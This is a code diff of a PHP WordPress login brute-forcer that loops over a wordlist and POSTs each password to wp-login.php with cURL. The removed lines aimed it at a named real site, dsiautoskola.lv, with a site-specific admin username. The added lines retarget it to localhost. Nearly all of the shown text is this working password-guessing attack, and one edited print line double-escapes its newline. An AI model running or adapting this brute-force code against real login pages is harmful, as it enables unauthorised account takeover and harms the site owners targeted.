@@ -7,14 +7,14 @@
     function read_wordlist(){
         $filename       = readline('Type wordlist file location: ');
         if (file_exists($filename)){
-            $name      = basename($filename);
+            $name       = basename($filename);
             print       "\033[33m[~] Loading {$name} wordlist...\033[0m\n";
             $file       = fopen($filename, 'r');
             $contents   = fread($file, filesize($filename));
             print       "\033[32m[+] {$name} loaded successfuly!\033[0m\n";
             return $contents;
         } else {
-            print       "[!] 404 File Not Found!\n";
+            print       "\033[31m[-][!] 404 File Not Found!\033[0m\\n";
             exit;
         }
     }
@@ -26,11 +26,11 @@
     function brute(string $wordlist){
         $wlist = explode("\n", $wordlist);
         foreach ($wlist as $password){
-            $curl = curl_init('http://dsiautoskola.lv/wordpress/wp-login.php');
+            $curl = curl_init('http://localhost/wordpress/wp-login.php');
                     curl_setopt_array($curl, [
                         CURLOPT_POST => true,
                         CURLOPT_POSTFIELDS => [
-                            'log' => 'admin@dsiautoskola',
+                            'log' => 'admin',
                             'pwd' => $password,
                             'wp-submit'
                         ],
